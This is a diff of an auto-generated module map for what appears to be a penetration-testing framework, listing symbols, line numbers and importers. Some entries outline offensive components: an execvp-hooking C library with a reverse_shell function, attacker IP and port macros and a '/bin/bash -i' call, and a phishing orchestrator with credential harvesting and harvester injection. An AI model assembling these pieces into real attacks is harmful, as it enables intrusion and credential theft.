-- Imported by: `cli/commands/marketplace.py`, `cli/commands/misc_migrated.py`, `cli/commands/misc_migrated.py`, `cli/commands/misc_migrated.py`, `cli/commands/module_manager.py`, `lazyown.py`, `lazyown.py`, `lazyown.py`, `mutants/tests/test_module_registry.py`, `skills/lazyown_mcp.py`, `tests/test_module_registry.py`
+- Imported by: `cli/commands/marketplace.py`, `cli/commands/misc_migrated.py`, `cli/commands/misc_migrated.py`, `cli/commands/misc_migrated.py`, `cli/commands/module_manager.py`, `lazyown.py`, `lazyown.py`, `lazyown.py`, `skills/lazyown_mcp.py`, `tests/test_module_registry.py`
 
 ## modules/moe_router.py
 - Layer: presentation
@@ -3077,11 +3128,19 @@
   - `_anneal_temperature` (method, line 647) `def _anneal_temperature(self)`
   - `adjusted_weight` (method, line 563) `def adjusted_weight(ep)`
 - Depends on: `core/logging.py`, `modules/toposwarm_bridge.py`
-- Imported by: `modules/lesson_ingestor.py`, `mutants/tests/integration_autonomous_flow.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_router_check_regression.py`, `mutants/tests/test_moe_router_check_regression.py`, `mutants/tests/test_moe_router_check_regression.py`, `mutants/tests/test_moe_router_check_regression.py`, `mutants/tests/test_moe_router_check_regression.py`, `mutants/tests/test_moe_router_check_regression.py`, `skills/swan_agent.py`, `skills/swan_agent.py`, `tests/integration_autonomous_flow.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_router_check_regression.py`, `tests/test_moe_router_check_regression.py`, `tests/test_moe_router_check_regression.py`, `tests/test_moe_router_check_regression.py`, `tests/test_moe_router_check_regression.py`, `tests/test_moe_router_check_regression.py`
+- Imported by: `modules/lesson_ingestor.py`, `skills/swan_agent.py`, `skills/swan_agent.py`, `tests/integration_autonomous_flow.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_router_check_regression.py`, `tests/test_moe_router_check_regression.py`, `tests/test_moe_router_check_regression.py`, `tests/test_moe_router_check_regression.py`, `tests/test_moe_router_check_regression.py`, `tests/test_moe_router_check_regression.py`
 
 ## modules/morse.py
 - Layer: utility
 - Language: py
+- Symbols:
+  - `MorseConfig` (class, line 16) `class MorseConfig`
+  - `reverse_morse_code` (method, line 98) `def reverse_morse_code()`
+  - `text_to_morse` (method, line 109) `def text_to_morse(text, config)`
+  - `morse_to_text` (method, line 130) `def morse_to_text(morse_code, config)`
+  - `clear_screen` (method, line 157) `def clear_screen(config)`
+  - `read_choice` (method, line 171) `def read_choice(config)`
+  - `run_driver` (method, line 186) `def run_driver(config)`
 
 ## modules/mysql_hookandroot_lib.c
 - Layer: utility
@@ -3089,10 +3148,19 @@
 - Symbols:
   - `reverse_shell` (function, line 74) `void reverse_shell(void)`
   - `execvp` (function, line 128) `int execvp(const char* filename, char* const argv[])`
-  - `_GNU_SOURCE` (macro, line 49)
-  - `ATTACKERS_IP` (macro, line 63)
-  - `SHELL_PORT` (macro, line 65)
-  - `INJECTED_CONF` (macro, line 66)
+  - `ssize_t` (function, line 69) `typedef ssize_t (*execvp_func_t)(const char *__file, char *const __argv[]);`
+  - `connect` (function, line 85) `connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));`
+  - `execle` (function, line 88) `execle( "/bin/bash", "/bin/bash", "-i", NULL, env_list );`
+  - `exit` (function, line 89) `exit(0);`
+  - `fgets` (function, line 114) `fgets(buffer, sizeof(buffer), conf);`
+  - `fclose` (function, line 121) `fclose(conf);`
+  - `close` (function, line 135) `close(fd);`
+  - `config_cleanup` (function, line 145) `config_cleanup();`
+  - `old_execvp` (function, line 146) `return old_execvp(filename, argv);`
+  - `_GNU_SOURCE` (macro, line 49) `#define _GNU_SOURCE`
+  - `ATTACKERS_IP` (macro, line 63) `#define ATTACKERS_IP`
+  - `SHELL_PORT` (macro, line 65) `#define SHELL_PORT`
+  - `INJECTED_CONF` (macro, line 66) `#define INJECTED_CONF`
 
 ## modules/network_opsec.py
 - Layer: utility
@@ -3208,7 +3276,7 @@
   - `register` (method, line 438) `def register(self, extractor)`
   - `parse` (method, line 442) `def parse(self, output, host, tool)`
 - Depends on: `cli/commands/enum.py`, `core/logging.py`
-- Imported by: `modules/intelligence_engine.py`, `modules/operation.py`, `modules/planner.py`, `modules/playbook_engine.py`, `mutants/tests/integration_autonomous_flow.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_phase1_data_gaps.py`, `skills/autonomous_daemon.py`, `skills/autonomous_daemon.py`, `skills/lazyown_mcp.py`, `tests/integration_autonomous_flow.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_phase1_data_gaps.py`
+- Imported by: `modules/intelligence_engine.py`, `modules/operation.py`, `modules/planner.py`, `modules/playbook_engine.py`, `skills/autonomous_daemon.py`, `skills/autonomous_daemon.py`, `skills/lazyown_mcp.py`, `tests/integration_autonomous_flow.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_phase1_data_gaps.py`
 
 ## modules/ooficesod0woodo.py
 - Layer: utility
@@ -3312,7 +3380,7 @@
   - `_find_alternatives` (method, line 754) `def _find_alternatives(cmd)`
   - `_build_explanation` (method, line 765) `def _build_explanation(cmd, noise, detects, gate)`
 - Depends on: `cli/commands/enum.py`, `core/config.py`, `core/logging.py`, `modules/db.py`, `modules/killchain.py`
-- Imported by: `cli/commands/opsec_cleanup.py`, `cli/commands/security.py`, `cli/commands/security.py`, `cli/commands/security.py`, `mutants/tests/test_opsec_scorer.py`, `tests/test_opsec_scorer.py`, `tests/test_opsec_scorer_consolidated.py`
+- Imported by: `cli/commands/opsec_cleanup.py`, `cli/commands/security.py`, `cli/commands/security.py`, `cli/commands/security.py`, `tests/test_opsec_scorer.py`, `tests/test_opsec_scorer_consolidated.py`
 
 ## modules/payload_factory.py
 - Layer: infrastructure
@@ -3350,124 +3418,124 @@
   - `generate` (method, line 521) `def generate(self, name, format, output)`
   - `_apply_format` (method, line 567) `def _apply_format(data, fmt)`
   - `list_formats` (method, line 665) `def list_formats()`
-- Imported by: `cli/commands/misc_migrated.py`, `cli/commands/payload_generation.py`, `lazyown.py`, `lazyown.py`, `lazyown.py`, `mutants/tests/test_payload_factory.py`, `tests/test_payload_factory.py`
+- Imported by: `cli/commands/misc_migrated.py`, `cli/commands/payload_generation.py`, `lazyown.py`, `lazyown.py`, `lazyown.py`, `scripts/devtools/core_smoke.py`, `tests/test_payload_factory.py`
 
 ## modules/phishing_orchestrator.py
 - Layer: utility
 - Language: py
 - Symbols:
-  - `_derive_credential_key` (function, line 58) `def _derive_credential_key()`
+  - `_derive_credential_key` (function, line 57) `def _derive_credential_key()`
   - `_encrypt_credential` (function, line 84) `def _encrypt_credential(plaintext)`
-  - `_decrypt_credential` (function, line 99) `def _decrypt_credential(encrypted_b64)`
-  - `_hash_credential_for_log` (function, line 114) `def _hash_credential_for_log(plaintext)`
-  - `CampaignTarget` (class, line 137) `class CampaignTarget`
-  - `PhishingTemplate` (class, line 152) `class PhishingTemplate`
-  - `CampaignResult` (class, line 165) `class CampaignResult`
-  - `PhishingOrchestrator` (class, line 178) `class PhishingOrchestrator`
-  - `__init__` (method, line 314) `def __init__(self)`
-  - `get_instance` (method, line 319) `def get_instance(cls)`
-  - `launch` (method, line 330) `def launch(self, target_domain, template, mode, targets_file, sender_email, sender_password, smtp_host, smtp_port)`
-  - `profile_targets` (method, line 439) `def profile_targets(self, domain)`
-  - `generate_template` (method, line 484) `def generate_template(self, name, target_domain, context)`
-  - `clone_landing_page` (method, line 531) `def clone_landing_page(self, url)`
-  - `get_results` (method, line 556) `def get_results(self, campaign_id)`
-  - `record_click` (method, line 580) `def record_click(self, campaign_id, email)`
-  - `record_credentials` (method, line 601) `def record_credentials(self, campaign_id, email, password)`
-  - `_load_targets_from_file` (method, line 638) `def _load_targets_from_file(self, filepath)`
-  - `_generate_landing_page` (method, line 677) `def _generate_landing_page(self, template, target_domain, campaign_id)`
-  - `_setup_harvesting_endpoint` (method, line 717) `def _setup_harvesting_endpoint(self, campaign_id)`
-  - `_send_email` (method, line 729) `def _send_email(self, to_email, subject, html_body, smtp_config)`
-  - `_inject_harvester` (method, line 765) `def _inject_harvester(self, html, page_id)`
-  - `_load_config` (method, line 804) `def _load_config(self)`
+  - `_decrypt_credential` (function, line 100) `def _decrypt_credential(encrypted_b64)`
+  - `_hash_credential_for_log` (function, line 116) `def _hash_credential_for_log(plaintext)`
+  - `CampaignTarget` (class, line 139) `class CampaignTarget`
+  - `PhishingTemplate` (class, line 154) `class PhishingTemplate`
+  - `CampaignResult` (class, line 167) `class CampaignResult`
+  - `PhishingOrchestrator` (class, line 180) `class PhishingOrchestrator`
+  - `__init__` (method, line 316) `def __init__(self)`
+  - `get_instance` (method, line 321) `def get_instance(cls)`
+  - `launch` (method, line 332) `def launch(self, target_domain, template, mode, targets_file, sender_email, sender_password, smtp_host, smtp_port)`
+  - `profile_targets` (method, line 441) `def profile_targets(self, domain)`
+  - `generate_template` (method, line 486) `def generate_template(self, name, target_domain, context)`
+  - `clone_landing_page` (method, line 533) `def clone_landing_page(self, url)`
+  - `get_results` (method, line 560) `def get_results(self, campaign_id)`
+  - `record_click` (method, line 584) `def record_click(self, campaign_id, email)`
+  - `record_credentials` (method, line 605) `def record_credentials(self, campaign_id, email, password)`
+  - `_load_targets_from_file` (method, line 644) `def _load_targets_from_file(self, filepath)`
+  - `_generate_landing_page` (method, line 683) `def _generate_landing_page(self, template, target_domain, campaign_id)`
+  - `_setup_harvesting_endpoint` (method, line 723) `def _setup_harvesting_endpoint(self, campaign_id)`
+  - `_send_email` (method, line 735) `def _send_email(self, to_email, subject, html_body, smtp_config)`
+  - `_inject_harvester` (method, line 769) `def _inject_harvester(self, html, page_id)`
+  - `_load_config` (method, line 808) `def _load_config(self)`
 - Depends on: `core/crypto.py`, `core/hardening.py`
-- Imported by: `cli/commands/phishing_wizard.py`, `cli/commands/phishing_wizard.py`, `mutants/tests/test_security_hardening_v3.py`, `mutants/tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v5.py`
+- Imported by: `cli/commands/phishing_wizard.py`, `cli/commands/phishing_wizard.py`, `tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v5.py`
 
 ## modules/pipeline_engine.py
 - Layer: utility
 - Language: py
 - Symbols:
-  - `PipelineError` (class, line 85) `class PipelineError(Exception)`
-  - `PipelineSchemaError` (class, line 89) `class PipelineSchemaError(PipelineError)`
-  - `PipelineNotFoundError` (class, line 93) `class PipelineNotFoundError(PipelineError)`
-  - `PipelineCycleError` (class, line 97) `class PipelineCycleError(PipelineError)`
-  - `PipelineStep` (class, line 107) `class PipelineStep`
-  - `PipelineSpec` (class, line 148) `class PipelineSpec`
-  - `StepResult` (class, line 159) `class StepResult`
-  - `PipelineRun` (class, line 195) `class PipelineRun`
-  - `_now_iso` (method, line 230) `def _now_iso()`
-  - `_new_run_id` (method, line 234) `def _new_run_id()`
-  - `_is_valid_pipeline_name` (method, line 238) `def _is_valid_pipeline_name(name)`
-  - `_load_payload` (method, line 244) `def _load_payload()`
-  - `TemplateResolver` (class, line 256) `class TemplateResolver`
-  - `ConditionEvaluator` (class, line 322) `class ConditionEvaluator`
-  - `StepValidator` (class, line 337) `class StepValidator`
-  - `StepDerivers` (class, line 371) `class StepDerivers`
-  - `_derive_ping` (method, line 410) `def _derive_ping(output)`
-  - `_derive_lazynmap` (method, line 425) `def _derive_lazynmap(output)`
-  - `_derive_searchsploit` (method, line 449) `def _derive_searchsploit(output)`
-  - `_derive_auto_populate` (method, line 468) `def _derive_auto_populate(output)`
-  - `_derive_facts_show` (method, line 477) `def _derive_facts_show(output)`
-  - `IStepRunner` (class, line 505) `class IStepRunner(ABC)`
-  - `LazyOwnStepRunner` (class, line 515) `class LazyOwnStepRunner(IStepRunner)`
-  - `_heuristic_success` (method, line 577) `def _heuristic_success(command, output)`
-  - `PipelineLoader` (class, line 601) `class PipelineLoader`
-  - `RunArtifactStore` (class, line 759) `class RunArtifactStore`
-  - `INarratorAdapter` (class, line 838) `class INarratorAdapter(ABC)`
-  - `_SilentNarrator` (class, line 853) `class _SilentNarrator(INarratorAdapter)`
-  - `EngagementNarratorAdapter` (class, line 858) `class EngagementNarratorAdapter(INarratorAdapter)`
-  - `PipelineEngine` (class, line 897) `class PipelineEngine`
-  - `get_default_engine` (method, line 1291) `def get_default_engine(onecmd)`
-  - `mcp_pipeline_run` (method, line 1305) `def mcp_pipeline_run(name, target, background, onecmd)`
-  - `mcp_pipeline_list` (method, line 1355) `def mcp_pipeline_list()`
-  - `mcp_pipeline_validate` (method, line 1369) `def mcp_pipeline_validate(name)`
-  - `mcp_pipeline_status` (method, line 1395) `def mcp_pipeline_status(last_n)`
-  - `cmd_pipeline` (method, line 1417) `def cmd_pipeline(action, name, target, background)`
-  - `to_context` (method, line 176) `def to_context(self)`
-  - `to_dict` (method, line 209) `def to_dict(self)`
-  - `__init__` (method, line 271) `def __init__(self, context)`
-  - `render` (method, line 274) `def render(self, template)`
-  - `resolve` (method, line 285) `def resolve(self, dotted_path)`
-  - `_stringify` (method, line 310) `def _stringify(value)`
-  - `is_truthy` (method, line 326) `def is_truthy(rendered)`
-  - `validate` (method, line 348) `def validate(predicate, output)`
-  - `register` (method, line 385) `def register(cls, command, deriver)`
-  - `derive` (method, line 394) `def derive(cls, command, output)`
-  - `run` (method, line 509) `def run(self, command, args, target, timeout_s)`
-  - `__init__` (method, line 529) `def __init__(self, runner, onecmd)`
-  - `run` (method, line 541) `def run(self, command, args, target, timeout_s)`
-  - `_run_via_onecmd` (method, line 555) `def _run_via_onecmd(self, command, args, target, timeout_s)`
-  - `__init__` (method, line 613) `def __init__(self, pipelines_dir)`
-  - `pipelines_dir` (method, line 617) `def pipelines_dir(self)`
-  - `list` (method, line 620) `def list(self)`
-  - `resolve_path` (method, line 633) `def resolve_path(self, name)`
-  - `_read` (method, line 652) `def _read(self, path)`
-  - `load` (method, line 664) `def load(self, name)`
-  - `_validate` (method, line 670) `def _validate(self, raw, name, source)`
-  - `__init__` (method, line 768) `def __init__(self, runs_dir)`
-  - `runs_dir` (method, line 772) `def runs_dir(self)`
-  - `open_run` (method, line 775) `def open_run(self, pipeline_name, run_id)`
-  - `write_plan` (method, line 787) `def write_plan(self, run_dir, spec)`
-  - `write_step` (method, line 804) `def write_step(self, run_dir, result)`
-  - `write_summary` (method, line 818) `def write_summary(self, run_dir, run)`
-  - `narrate` (method, line 842) `def narrate(self, kind, target, message, payload, severity)`
-  - `narrate` (method, line 854) `def narrate(self)`
-  - `__init__` (method, line 861) `def __init__(self, narrator)`
-  - `narrate` (method, line 870) `def narrate(self, kind, target, message, payload, severity)`
-  - `__init__` (method, line 916) `def __init__(self, runner, loader, artifact_store, narrator, max_nesting)`
-  - `loader` (method, line 931) `def loader(self)`
-  - `validate` (method, line 934) `def validate(self, name)`
-  - `run` (method, line 938) `def run(self, name, target, nesting_stack)`
-  - `_run_command` (method, line 1072) `def _run_command(self, step, resolver, target)`
-  - `_run_nested` (method, line 1121) `def _run_nested(self, step, resolver, target, stack, run)`
-  - `_run_hook` (method, line 1173) `def _run_hook(self, hook_command, target, timeout_s)`
-  - `_make_skipped` (method, line 1198) `def _make_skipped(step, reason)`
-  - `_build_context` (method, line 1213) `def _build_context(self, spec, target, step_results, derived_findings, current_step)`
-  - `_merge_findings` (method, line 1238) `def _merge_findings(derived_findings, result)`
-  - `_narrate_step` (method, line 1247) `def _narrate_step(self, result, target)`
-  - `_worker` (method, line 1333) `def _worker()`
-  - `_replace` (method, line 278) `def _replace(match)`
+  - `PipelineError` (class, line 87) `class PipelineError(Exception)`
+  - `PipelineSchemaError` (class, line 91) `class PipelineSchemaError(PipelineError)`
+  - `PipelineNotFoundError` (class, line 95) `class PipelineNotFoundError(PipelineError)`
+  - `PipelineCycleError` (class, line 99) `class PipelineCycleError(PipelineError)`
+  - `PipelineStep` (class, line 109) `class PipelineStep`
+  - `PipelineSpec` (class, line 150) `class PipelineSpec`
+  - `StepResult` (class, line 161) `class StepResult`
+  - `PipelineRun` (class, line 197) `class PipelineRun`
+  - `_now_iso` (method, line 232) `def _now_iso()`
+  - `_new_run_id` (method, line 236) `def _new_run_id()`
+  - `_is_valid_pipeline_name` (method, line 240) `def _is_valid_pipeline_name(name)`
+  - `_load_payload` (method, line 246) `def _load_payload()`
+  - `TemplateResolver` (class, line 258) `class TemplateResolver`
+  - `ConditionEvaluator` (class, line 324) `class ConditionEvaluator`
+  - `StepValidator` (class, line 339) `class StepValidator`
+  - `StepDerivers` (class, line 373) `class StepDerivers`
+  - `_derive_ping` (method, line 412) `def _derive_ping(output)`
+  - `_derive_lazynmap` (method, line 427) `def _derive_lazynmap(output)`
+  - `_derive_searchsploit` (method, line 451) `def _derive_searchsploit(output)`
+  - `_derive_auto_populate` (method, line 470) `def _derive_auto_populate(output)`
+  - `_derive_facts_show` (method, line 479) `def _derive_facts_show(output)`
+  - `IStepRunner` (class, line 507) `class IStepRunner(ABC)`
+  - `LazyOwnStepRunner` (class, line 517) `class LazyOwnStepRunner(IStepRunner)`
+  - `_heuristic_success` (method, line 574) `def _heuristic_success(command, output)`
+  - `PipelineLoader` (class, line 598) `class PipelineLoader`
+  - `RunArtifactStore` (class, line 756) `class RunArtifactStore`
+  - `INarratorAdapter` (class, line 835) `class INarratorAdapter(ABC)`
+  - `_SilentNarrator` (class, line 850) `class _SilentNarrator(INarratorAdapter)`
+  - `EngagementNarratorAdapter` (class, line 855) `class EngagementNarratorAdapter(INarratorAdapter)`
+  - `PipelineEngine` (class, line 894) `class PipelineEngine`
+  - `get_default_engine` (method, line 1288) `def get_default_engine(onecmd)`
+  - `mcp_pipeline_run` (method, line 1302) `def mcp_pipeline_run(name, target, background, onecmd)`
+  - `mcp_pipeline_list` (method, line 1352) `def mcp_pipeline_list()`
+  - `mcp_pipeline_validate` (method, line 1366) `def mcp_pipeline_validate(name)`
+  - `mcp_pipeline_status` (method, line 1392) `def mcp_pipeline_status(last_n)`
+  - `cmd_pipeline` (method, line 1414) `def cmd_pipeline(action, name, target, background)`
+  - `to_context` (method, line 178) `def to_context(self)`
+  - `to_dict` (method, line 211) `def to_dict(self)`
+  - `__init__` (method, line 273) `def __init__(self, context)`
+  - `render` (method, line 276) `def render(self, template)`
+  - `resolve` (method, line 287) `def resolve(self, dotted_path)`
+  - `_stringify` (method, line 312) `def _stringify(value)`
+  - `is_truthy` (method, line 328) `def is_truthy(rendered)`
+  - `validate` (method, line 350) `def validate(predicate, output)`
+  - `register` (method, line 387) `def register(cls, command, deriver)`
+  - `derive` (method, line 396) `def derive(cls, command, output)`
+  - `run` (method, line 511) `def run(self, command, args, target, timeout_s)`
+  - `__init__` (method, line 531) `def __init__(self, runner, onecmd)`
+  - `run` (method, line 543) `def run(self, command, args, target, timeout_s)`
+  - `_run_via_onecmd` (method, line 557) `def _run_via_onecmd(self, command, args, target, timeout_s)`
+  - `__init__` (method, line 610) `def __init__(self, pipelines_dir)`
+  - `pipelines_dir` (method, line 614) `def pipelines_dir(self)`
+  - `list` (method, line 617) `def list(self)`
+  - `resolve_path` (method, line 630) `def resolve_path(self, name)`
+  - `_read` (method, line 649) `def _read(self, path)`
+  - `load` (method, line 661) `def load(self, name)`
+  - `_validate` (method, line 667) `def _validate(self, raw, name, source)`
+  - `__init__` (method, line 765) `def __init__(self, runs_dir)`
+  - `runs_dir` (method, line 769) `def runs_dir(self)`
+  - `open_run` (method, line 772) `def open_run(self, pipeline_name, run_id)`
+  - `write_plan` (method, line 784) `def write_plan(self, run_dir, spec)`
+  - `write_step` (method, line 801) `def write_step(self, run_dir, result)`
+  - `write_summary` (method, line 815) `def write_summary(self, run_dir, run)`
+  - `narrate` (method, line 839) `def narrate(self, kind, target, message, payload, severity)`
+  - `narrate` (method, line 851) `def narrate(self)`
+  - `__init__` (method, line 858) `def __init__(self, narrator)`
+  - `narrate` (method, line 867) `def narrate(self, kind, target, message, payload, severity)`
+  - `__init__` (method, line 913) `def __init__(self, runner, loader, artifact_store, narrator, max_nesting)`
+  - `loader` (method, line 928) `def loader(self)`
+  - `validate` (method, line 931) `def validate(self, name)`
+  - `run` (method, line 935) `def run(self, name, target, nesting_stack)`
+  - `_run_command` (method, line 1069) `def _run_command(self, step, resolver, target)`
+  - `_run_nested` (method, line 1118) `def _run_nested(self, step, resolver, target, stack, run)`
+  - `_run_hook` (method, line 1170) `def _run_hook(self, hook_command, target, timeout_s)`
+  - `_make_skipped` (method, line 1195) `def _make_skipped(step, reason)`
+  - `_build_context` (method, line 1210) `def _build_context(self, spec, target, step_results, derived_findings, current_step)`
+  - `_merge_findings` (method, line 1235) `def _merge_findings(derived_findings, result)`
+  - `_narrate_step` (method, line 1244) `def _narrate_step(self, result, target)`
+  - `_worker` (method, line 1330) `def _worker()`
+  - `_replace` (method, line 280) `def _replace(match)`
 - Depends on: `core/logging.py`, `modules/engagement_hooks.py`, `skills/autonomous_daemon.py`
-- Imported by: `cli/commands/misc_migrated.py`, `cli/commands/misc_migrated.py`, `cli/commands/misc_migrated.py`, `cli/commands/misc_migrated.py`, `modules/playbook_executor.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `mutants/tests/test_pipeline_engine.py`, `skills/autonomous_daemon.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`
+- Imported by: `cli/commands/misc_migrated.py`, `cli/commands/misc_migrated.py`, `cli/commands/misc_migrated.py`, `cli/commands/misc_migrated.py`, `modules/playbook_executor.py`, `skills/autonomous_daemon.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`, `tests/test_pipeline_engine.py`
 
 ## modules/planner.py
 - Layer: utility
@@ -3494,39 +3562,39 @@
 - Layer: utility
 - Language: py
 - Symbols:
-  - `PlaybookStep` (class, line 97) `class PlaybookStep`
-  - `Playbook` (class, line 129) `class Playbook`
-  - `StepResult` (class, line 161) `class StepResult`
-  - `PlaybookResult` (class, line 169) `class PlaybookResult`
-  - `_StixLoader` (class, line 180) `class _StixLoader`
-  - `_AtomicIndex` (class, line 247) `class _AtomicIndex`
-  - `_TechniqueSelector` (class, line 302) `class _TechniqueSelector`
-  - `PlaybookEngine` (class, line 363) `class PlaybookEngine`
-  - `get_engine` (method, line 649) `def get_engine(api_key)`
-  - `to_dict` (method, line 109) `def to_dict(self)`
-  - `from_dict` (method, line 124) `def from_dict(cls, d)`
-  - `to_dict` (method, line 137) `def to_dict(self)`
-  - `from_dict` (method, line 148) `def from_dict(cls, d)`
-  - `__init__` (method, line 183) `def __init__(self, json_path)`
-  - `available` (method, line 187) `def available(self)`
-  - `store` (method, line 190) `def store(self)`
-  - `techniques_for_tactics` (method, line 204) `def techniques_for_tactics(self, tactic_shortnames, platform)`
-  - `__init__` (method, line 253) `def __init__(self, atomics_path)`
-  - `available` (method, line 257) `def available(self)`
-  - `build` (method, line 260) `def build(self)`
-  - `tests_for_technique` (method, line 291) `def tests_for_technique(self, technique_id, platform)`
-  - `select` (method, line 308) `def select(self, candidates, world_context, target, phase, api_key, top_n)`
-  - `__init__` (method, line 375) `def __init__(self, world_model, obs_parser, api_key, top_n)`
-  - `_world_model` (method, line 392) `def _world_model(self)`
-  - `_obs_parser` (method, line 402) `def _obs_parser(self)`
-  - `derive` (method, line 413) `def derive(self, target, phase, platform, apt_name)`
-  - `execute` (method, line 509) `def execute(self, playbook, executor, dry_run)`
-  - `save` (method, line 574) `def save(self, playbook, path)`
-  - `load` (method, line 587) `def load(self, path)`
-  - `result_summary` (method, line 614) `def result_summary(self, result)`
-  - `_local_executor` (method, line 701) `def _local_executor(command, host)`
-- Depends on: `core/logging.py`, `modules/llm_client.py`, `modules/obs_parser.py`, `modules/world_model.py`
